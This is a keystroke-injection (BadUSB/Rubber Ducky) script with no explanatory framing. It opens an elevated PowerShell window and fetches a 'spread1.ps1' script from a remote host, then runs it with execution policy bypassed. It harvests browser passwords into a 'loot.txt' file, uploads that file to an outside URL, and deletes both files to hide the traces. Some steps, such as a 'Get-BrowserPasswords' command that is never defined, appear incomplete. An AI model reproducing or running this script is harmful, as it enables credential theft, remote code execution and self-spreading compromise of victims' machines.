DELAY 5000
CONTROL ESCAPE
DELAY 500
STRING powershell
DELAY 500
CTRL-SHIFT ENTER
DELAY 500
DELAY 1000
STRING $spreadScript = '$s="http://www.gotyou.com/spread1.ps1";iwr -Uri $s -OutFile "C:\Users\Public\spread1.ps1";powershell -ExecutionPolicy Bypass -File "C:\Users\Public\spread1.ps1"'
ENTER
DELAY 1000
STRING New-Item -Path "C:\Users\Public\spread1.ps1" -ItemType "file" -Value $spreadScript
ENTER
DELAY 1000
STRING powershell -ExecutionPolicy Bypass -File "C:\Users\Public\spread1.ps1"
ENTER
DELAY 2000
STRING $lootedData = Get-BrowserPasswords
ENTER
STRING $lootedData | Out-File -FilePath "C:\Users\Public\loot.txt"
ENTER
DELAY 1000
STRING $url = 'https://example.com/upload'; $filePath = 'C:\Users\Public\loot.txt'; Invoke-RestMethod -Uri $url -Method Post -InFile $filePath
ENTER
DELAY 5000
STRING Remove-Item -Path "C:\Users\Public\spread1.ps1"
ENTER
STRING Remove-Item -Path "C:\Users\Public\loot.txt"
ENTER
STRING exit
ENTER